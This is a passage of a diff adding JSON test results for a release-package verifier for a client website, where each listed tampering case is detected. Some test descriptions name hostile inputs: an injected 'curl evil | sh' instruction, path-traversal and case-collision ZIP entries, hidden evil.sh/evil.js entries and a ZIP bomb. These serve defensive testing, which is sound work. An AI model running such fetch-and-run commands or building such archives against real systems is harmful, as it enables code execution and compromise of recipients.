+      "detail": "exit 1: REFUSED: this build is a client-production build (configuration: demo false, noindex false); it cannot be released as \"demonstration\".",
+      "expected": "as stated",
+      "observed": "exit 1: REFUSED: this build is a client-production build (configuration: demo false, noindex false); it cannot be released as \"demonstration\"."
+    },
+    {
+      "g": "environment",
+      "t": "an unknown command exits 2 and does nothing",
+      "ok": true,
+      "detail": "exit 2",
+      "expected": "as stated",
+      "observed": "exit 2"
+    },
+    {
+      "g": "environment",
+      "t": "a deployment authorisation for the candidate, the release approval and the host is reported, and the tool still only prints",
+      "ok": true,
+      "detail": "allowed true, deployment approved true",
+      "expected": "as stated",
+      "observed": "allowed true, deployment approved true"
+    },
+    {
+      "g": "environment",
+      "t": "the deployment family is audited on its own",
+      "ok": true,
+      "detail": "deployment-authorisation: SATISFIED — DEP-JE-901 (Dry-run Deployer Persona, 2026-10-12)",
+      "expected": "as stated",
+      "observed": "deployment-authorisation: SATISFIED — DEP-JE-901 (Dry-run Deployer Persona, 2026-10-12)"
+    },
+    {
+      "g": "environment",
+      "t": "a deployment authorisation does not unblock a build that is missing its release approval",
+      "ok": true,
+      "detail": "failing releaseApproval, productionHostAuthorised; deployment approved false",
+      "expected": "as stated",
+      "observed": "failing releaseApproval, productionHostAuthorised; deployment approved false"
+    },
+    {
+      "g": "environment",
+      "t": "a deployment authorisation that relies on another release approval is not reported as authorised",
+      "ok": true,
+      "detail": "allowed true; deployment approved false",
+      "expected": "as stated",
+      "observed": "allowed true; deployment approved false"
+    },
+    {
+      "g": "environment",
+      "t": "a deployment authorisation for another host is not reported as authorised",
+      "ok": true,
+      "detail": "allowed true; deployment approved false",
+      "expected": "as stated",
+      "observed": "allowed true; deployment approved false"
+    },
+    {
+      "g": "environment",
+      "t": "a revoked deployment authorisation is not reported as authorised",
+      "ok": true,
+      "detail": "allowed true; deployment approved false",
+      "expected": "as stated",
+      "observed": "allowed true; deployment approved false"
+    },
+    {
+      "g": "environment",
+      "t": "the approvals are audited on their own: three records in force, nothing about evidence",
+      "ok": true,
+      "detail": "release-approval: SATISFIED — REL-JE-901 (Dry-run Owner Persona, 2026-10-12)",
+      "expected": "as stated",
+      "observed": "release-approval: SATISFIED — REL-JE-901 (Dry-run Owner Persona, 2026-10-12)"
+    },
+    {
+      "g": "environment",
+      "t": "the evidence is audited on its own: 9 records, all four requirements satisfied",
+      "ok": true,
+      "detail": "4 requirements satisfied",
+      "expected": "as stated",
+      "observed": "4 requirements satisfied"
+    },
+    {
+      "g": "environment",
+      "t": "the verification record is audited on its own and valid for this build",
+      "ok": true,
+      "detail": "== verification (engineering/.reports/verify.json): valid for this build",
+      "expected": "as stated",
+      "observed": "== verification (engineering/.reports/verify.json): valid for this build"
+    },
+    {
+      "g": "environment",
+      "t": "prepare on a blocked build exits 1, says NOT PREPARED and writes no release folder",
+      "ok": true,
+      "detail": "exit 1; release folder exists: false",
+      "expected": "as stated",
+      "observed": "exit 1; release folder exists: false"
+    },
+    {
+      "g": "ledger",
+      "rg": "RG-01",
+      "t": "the approvals, the evidence and the CI summary are committed to the repository (the documented flow): HEAD moves, the candidate digest does not, and the gate passes",
+      "ok": true,
+      "expected": "ALLOWED; HEAD changed; candidate digest unchanged",
+      "observed": "ALLOWED; HEAD e1e117b -> 34811eb; candidate 2a25b114d728… -> 2a25b114d728…"
+    },
+    {
+      "g": "ledger",
+      "rg": "RG-01",
+      "t": "every record names the candidate digest and no record names HEAD",
+      "ok": true,
+      "expected": "bound to the artifact, not to a commit",
+      "observed": "checked"
+    },
+    {
+      "g": "package",
+      "t": "prepare on the fully green synthetic build writes a package that verifies",
+      "ok": true,
+      "detail": "ok files, ok checksums, ok manifest, ok package-binding, ok gate-recorded, ok package-name, ok zip-contents, ok package-extras, ok asset-tree, ok search-digest, ok security, ok candidate-digest, ok records-embedded, ok sbom, ok rules-match-repository, ok verification-record, ok production-host, ok approvals-recorded, ok evidence-recorded, ok external-links, ok rights-inventory, ok social-images, ok supply-chain, ok authenticity, ok demonstration-marker, ok channel-text",
+      "expected": "as stated",
+      "observed": "ok files, ok checksums, ok manifest, ok package-binding, ok gate-recorded, ok package-name, ok zip-contents, ok package-extras, ok asset-tree, ok search-digest, ok security, ok candidate-digest, ok records-embedded, ok sbom, ok rules-match-repository, ok verification-record, ok production-host, ok approvals-recorded, ok evidence-recorded, ok external-links, ok rights-inventory, ok social-images, ok supply-chain, ok authenticity, ok demonstration-marker, ok channel-text"
+    },
+    {
+      "g": "package",
+      "t": "preparing the same commit twice gives byte-identical files (reproducible)",
+      "ok": true,
+      "detail": "45 files compared",
+      "expected": "as stated",
+      "observed": "45 files compared"
+    },
+    {
+      "g": "package",
+      "t": "one byte of the ZIP flipped",
+      "ok": true,
+      "detail": "failing: checksums, package-binding, zip — hash mismatch: jade-and-ember-1.0.0-site.zip",
+      "expected": "as stated",
+      "observed": "failing: checksums, package-binding, zip — hash mismatch: jade-and-ember-1.0.0-site.zip"
+    },
+    {
+      "g": "package",
+      "t": "the manifest edited (version changed)",
+      "ok": true,
+      "detail": "failing: checksums, package-name, package-extras, candidate-digest, approvals-recorded, external-links, rights-inventory, social-images — hash mismatch: release-manifest.json",
+      "expected": "as stated",
+      "observed": "failing: checksums, package-name, package-extras, candidate-digest, approvals-recorded, external-links, rights-inventory, social-images — hash mismatch: release-manifest.json"
+    },
+    {
+      "g": "package",
+      "t": "a line deleted from SHA256SUMS.txt",
+      "ok": true,
+      "detail": "failing: checksums — SHA256SUMS.txt lists release-manifest.json; expected jade-and-ember-1.0.0-site.zip, release-manifest.json, sbo",
+      "expected": "as stated",
+      "observed": "failing: checksums — SHA256SUMS.txt lists release-manifest.json; expected jade-and-ember-1.0.0-site.zip, release-manifest.json, sbo"
+    },
+    {
+      "g": "package",
+      "t": "SHA256SUMS.txt lists an extra file",
+      "ok": true,
+      "detail": "failing: checksums — SHA256SUMS.txt lists extra.bin, jade-and-ember-1.0.0-site.zip, release-manifest.json, sbom.cdx.json; expected ",
+      "expected": "as stated",
+      "observed": "failing: checksums — SHA256SUMS.txt lists extra.bin, jade-and-ember-1.0.0-site.zip, release-manifest.json, sbom.cdx.json; expected "
+    },
+    {
+      "g": "package",
+      "t": "host/_headers weakened (the CSP removed) — not covered by SHA256SUMS",
+      "ok": true,
+      "detail": "failing: security — host/_headers differs from what the delivered pages require",
+      "expected": "as stated",
+      "observed": "failing: security — host/_headers differs from what the delivered pages require"
+    },
+    {
+      "g": "package",
+      "t": "host/nginx.conf edited",
+      "ok": true,
+      "detail": "failing: security — host/nginx.conf differs from what the delivered pages require",
+      "expected": "as stated",
+      "observed": "failing: security — host/nginx.conf differs from what the delivered pages require"
+    },
+    {
+      "g": "package",
+      "t": "a host file missing",
+      "ok": true,
+      "detail": "failing: files — missing host/htaccess",
+      "expected": "as stated",
+      "observed": "failing: files — missing host/htaccess"
+    },
+    {
+      "g": "package",
+      "t": "the records folder missing (reviewer table)",
+      "ok": true,
+      "detail": "failing: files — missing records/reviewers.json",
+      "expected": "as stated",
+      "observed": "failing: files — missing records/reviewers.json"
+    },
+    {
+      "g": "package",
+      "t": "the ZIP replaced by another valid ZIP, checksums updated, manifest not",
+      "ok": true,
+      "detail": "failing: checksums, package-binding, zip-contents, package-extras, asset-tree — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, package-binding, zip-contents, package-extras, asset-tree — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "the manifest says the gate BLOCKED this build",
+      "ok": true,
+      "detail": "failing: checksums, gate-recorded — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, gate-recorded — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "the manifest records a dirty source tree",
+      "ok": true,
+      "detail": "failing: checksums, gate-recorded — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, gate-recorded — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "a script added to the ZIP; manifest package hash, asset tree and checksums updated: the ZIP is no longer the approved artifact",
+      "ok": true,
+      "detail": "failing: checksums, candidate-digest, sbom, evidence-recorded, external-links — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "rg": "RG-14",
+      "expected": "as stated",
+      "observed": "failing: checksums, candidate-digest, sbom, evidence-recorded, external-links — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "a script added to the ZIP; manifest package hash and checksums updated (asset tree not)",
+      "ok": true,
+      "detail": "failing: checksums, asset-tree, candidate-digest, sbom, external-links — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, asset-tree, candidate-digest, sbom, external-links — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "a file that does not belong in a delivered site (config/client.json) added",
+      "ok": true,
+      "detail": "failing: checksums, zip-contents, sbom — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, zip-contents, sbom — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "a ZIP entry that escapes the folder (../evil)",
+      "ok": true,
+      "detail": "failing: checksums, zip — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, zip — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "the manifest names another candidate digest than the ZIP produces (even with a consistent manifest)",
+      "ok": true,
+      "detail": "failing: checksums, package-extras, candidate-digest, verification-record, approvals-recorded, evidence-recorded, external-links, rights-inventory, social-images — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "rg": "RG-01",
+      "expected": "as stated",
+      "observed": "failing: checksums, package-extras, candidate-digest, verification-record, approvals-recorded, evidence-recorded, external-links, rights-inventory, social-images — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "the manifest's non-delivered parts edited (the policy digest), digest left",
+      "ok": true,
+      "detail": "failing: checksums, candidate-digest, rules-match-repository — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, candidate-digest, rules-match-repository — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "the release approval removed from the package, manifest list updated",
+      "ok": true,
+      "detail": "failing: checksums, approvals-recorded — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, approvals-recorded — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "the release approval in the package edited to another candidate, manifest hash updated",
+      "ok": true,
+      "detail": "failing: checksums, approvals-recorded — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, approvals-recorded — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "the release approval in the package edited, manifest hash NOT updated",
+      "ok": true,
+      "detail": "failing: records-embedded, approvals-recorded — the records in the package are not the ones the manifest lists (added, removed or edited)",
+      "expected": "as stated",
+      "observed": "failing: records-embedded, approvals-recorded — the records in the package are not the ones the manifest lists (added, removed or edited)"
+    },
+    {
+      "g": "package",
+      "t": "a record added to the package that the manifest does not list",
+      "ok": true,
+      "detail": "failing: records-embedded, approvals-recorded — the records in the package are not the ones the manifest lists (added, removed or edited)",
+      "expected": "as stated",
+      "observed": "failing: records-embedded, approvals-recorded — the records in the package are not the ones the manifest lists (added, removed or edited)"
+    },
+    {
+      "g": "package",
+      "t": "the release approval in the package REVOKED, manifest updated",
+      "ok": true,
+      "detail": "failing: checksums, approvals-recorded — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "rg": "RG-06",
+      "expected": "as stated",
+      "observed": "failing: checksums, approvals-recorded — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "the release approval in the package REJECTED, manifest updated",
+      "ok": true,
+      "detail": "failing: checksums, approvals-recorded — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "rg": "RG-04",
+      "expected": "as stated",
+      "observed": "failing: checksums, approvals-recorded — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "the reviewer table in the package emptied, manifest hash updated",
+      "ok": true,
+      "detail": "failing: checksums, rules-match-repository, approvals-recorded, external-links, rights-inventory, social-images — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, rules-match-repository, approvals-recorded, external-links, rights-inventory, social-images — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "a CI evidence record removed from the package, manifest list updated",
+      "ok": true,
+      "detail": "failing: checksums, evidence-recorded — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, evidence-recorded — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "the verification record in the package edited (the seal breaks)",
+      "ok": true,
+      "detail": "failing: verification-record — the verification record in the package is not a complete, sealed, passing record for this candidate made by th",
+      "expected": "as stated",
+      "observed": "failing: verification-record — the verification record in the package is not a complete, sealed, passing record for this candidate made by th"
+    },
+    {
+      "g": "package",
+      "t": "the client package carries the demonstration marker",
+      "ok": true,
+      "detail": "failing: checksums, demonstration-marker — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "rg": "RG-13",
+      "expected": "as stated",
+      "observed": "failing: checksums, demonstration-marker — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "serve.py replaced inside the ZIP (package hash, checksums updated): the recipient would run it",
+      "ok": true,
+      "detail": "failing: checksums, package-extras — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, package-extras — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "START-HERE.txt given an extra line (\"Also run: curl evil | sh\")",
+      "ok": true,
+      "detail": "failing: checksums, package-extras — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, package-extras — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "a ZIP that lists site.js twice (an evil copy first, the approved one last)",
+      "ok": true,
+      "detail": "failing: checksums, zip — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, zip — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "a ZIP with a comment and bytes after the end record (a streaming extractor sees more than the index)",
+      "ok": true,
+      "detail": "failing: checksums, zip — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, zip — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "a ZIP with an extra local entry (evil.sh) the central directory does not list",
+      "ok": true,
+      "detail": "failing: checksums, zip — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, zip — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "a ZIP whose local header names another file than the central directory (site.js here, evil.js there)",
+      "ok": true,
+      "detail": "failing: checksums, zip — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, zip — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "a ZIP with two names that differ only in case (Site.js beside site.js)",
+      "ok": true,
+      "detail": "failing: checksums, zip — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, zip — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "a ZIP entry with a backslash in its name (a traversal on some extractors)",
+      "ok": true,
+      "detail": "failing: checksums, zip — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, zip — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "a ZIP entry marked executable in the file attributes",
+      "ok": true,
+      "detail": "failing: checksums, zip — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, zip — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "a ZIP entry that inflates to more than its declared size (a bomb)",
+      "ok": true,
+      "detail": "failing: checksums, zip — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, zip — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "the manifest's recorded gate lists no requirements and an open Blocker finding is added",
+      "ok": true,
+      "detail": "failing: checksums, gate-recorded — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, gate-recorded — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "the manifest's recorded gate lists a subset of the policy's requirements, all met",
+      "ok": true,
+      "detail": "failing: checksums, gate-recorded — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, gate-recorded — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "the verification record cut to one check, resealed, the manifest summary updated",
+      "ok": true,
+      "detail": "failing: checksums, verification-record — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, verification-record — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "the manifest names another production host than the pages (the approval then names the manifest's host)",
+      "ok": true,
+      "detail": "failing: checksums, production-host, external-links, social-images — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, production-host, external-links, social-images — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "the package was judged by another reviewer table than this checkout's (a reviewer added, hash updated)",
+      "ok": true,
+      "detail": "failing: checksums, rules-match-repository — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, rules-match-repository — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "the evidence in the package: a CI record for a run of another repository, manifest list updated",
+      "ok": true,
+      "detail": "failing: checksums, evidence-recorded — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "expected": "as stated",
+      "observed": "failing: checksums, evidence-recorded — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "the ZIP changed, the manifest's parts AND digest recomputed to match, the embedded records left bound to the old artifact",
+      "ok": true,
+      "detail": "failing: checksums, package-extras, sbom, verification-record, approvals-recorded, evidence-recorded, external-links, rights-inventory, social-images — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "rg": "RG-01",
+      "expected": "as stated",
+      "observed": "failing: checksums, package-extras, sbom, verification-record, approvals-recorded, evidence-recorded, external-links, rights-inventory, social-images — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "RG-14: the green package, verified with the real authenticity verifier, fails on authenticity alone (nothing else is wrong with it)",
+      "ok": true,
+      "detail": "failing: authenticity",
+      "rg": "RG-14",
+      "expected": "as stated",
+      "observed": "failing: authenticity"
+    },
+    {
+      "g": "package",
+      "t": "the SBOM edited (one byte), checksums not updated",
+      "ok": true,
+      "detail": "failing: checksums, sbom, supply-chain — hash mismatch: sbom.cdx.json",
+      "rg": "RG-11",
+      "expected": "as stated",
+      "observed": "failing: checksums, sbom, supply-chain — hash mismatch: sbom.cdx.json"
+    },
+    {
+      "g": "package",
+      "t": "the SBOM with a delivered file's hash changed, manifest and checksums made consistent",
+      "ok": true,
+      "detail": "failing: sbom, supply-chain — the composite SBOM: fonts/LICENSES.txt: the SBOM records another hash",
+      "rg": "RG-11",
+      "expected": "as stated",
+      "observed": "failing: sbom, supply-chain — the composite SBOM: fonts/LICENSES.txt: the SBOM records another hash"
+    },
+    {
+      "g": "package",
+      "t": "the SBOM of another lockfile, manifest and checksums made consistent",
+      "ok": true,
+      "detail": "failing: sbom, supply-chain — the composite SBOM: it describes another lockfile than the candidate",
+      "rg": "RG-11",
+      "expected": "as stated",
+      "observed": "failing: sbom, supply-chain — the composite SBOM: it describes another lockfile than the candidate"
+    },
+    {
+      "g": "package",
+      "t": "the external-links history in the package edited (a clickable link blocked), manifest updated",
+      "ok": true,
+      "detail": "failing: checksums, external-links — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "rg": "RG-02",
+      "expected": "as stated",
+      "observed": "failing: checksums, external-links — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "the external-links history in the package replaced by an empty one, manifest updated",
+      "ok": true,
+      "detail": "failing: checksums, external-links — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "rg": "RG-02",
+      "expected": "as stated",
+      "observed": "failing: checksums, external-links — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "the external-links history in the package edited, manifest NOT updated",
+      "ok": true,
+      "detail": "failing: records-embedded, external-links — the records in the package are not the ones the manifest lists (added, removed or edited)",
+      "rg": "RG-02",
+      "expected": "as stated",
+      "observed": "failing: records-embedded, external-links — the records in the package are not the ones the manifest lists (added, removed or edited)"
+    },
+    {
+      "g": "package",
+      "t": "the supply-chain history in the package emptied, manifest updated",
+      "ok": true,
+      "detail": "failing: checksums, supply-chain — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "rg": "RG-10",
+      "expected": "as stated",
+      "observed": "failing: checksums, supply-chain — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "the supply-chain history in the package shows a high advisory, manifest updated",
+      "ok": true,
+      "detail": "failing: checksums, supply-chain — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "rg": "RG-10",
+      "expected": "as stated",
+      "observed": "failing: checksums, supply-chain — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "the dependency register in the package edited (an exception added), no longer the one the candidate covers",
+      "ok": true,
+      "detail": "failing: records-embedded — the records in the package are not the ones the manifest lists (added, removed or edited)",
+      "rg": "RG-10",
+      "expected": "as stated",
+      "observed": "failing: records-embedded — the records in the package are not the ones the manifest lists (added, removed or edited)"
+    },
+    {
+      "g": "package",
+      "t": "the rights inventory in the package edited (an image marked unverified), no longer the one the candidate covers",
+      "ok": true,
+      "detail": "failing: records-embedded, rights-inventory, social-images — the records in the package are not the ones the manifest lists (added, removed or edited)",
+      "rg": "RG-03",
+      "expected": "as stated",
+      "observed": "failing: records-embedded, rights-inventory, social-images — the records in the package are not the ones the manifest lists (added, removed or edited)"
+    },
+    {
+      "g": "package",
+      "t": "the rights record in the package revoked, manifest updated: the inventory still says verified",
+      "ok": true,
+      "detail": "failing: checksums, approvals-recorded, rights-inventory, social-images — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "rg": "RG-03",
+      "expected": "as stated",
+      "observed": "failing: checksums, approvals-recorded, rights-inventory, social-images — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "the rights record in the package edited to cover other media (inventory digest), manifest updated",
+      "ok": true,
+      "detail": "failing: checksums, approvals-recorded, rights-inventory, social-images — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "rg": "RG-03",
+      "expected": "as stated",
+      "observed": "failing: checksums, approvals-recorded, rights-inventory, social-images — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "the external-links review in the package edited to review another destination list, manifest updated",
+      "ok": true,
+      "detail": "failing: checksums, external-links — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "rg": "RG-02",
+      "expected": "as stated",
+      "observed": "failing: checksums, external-links — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "the supply-chain history in the package covering fewer packages than the lockfile, manifest updated",
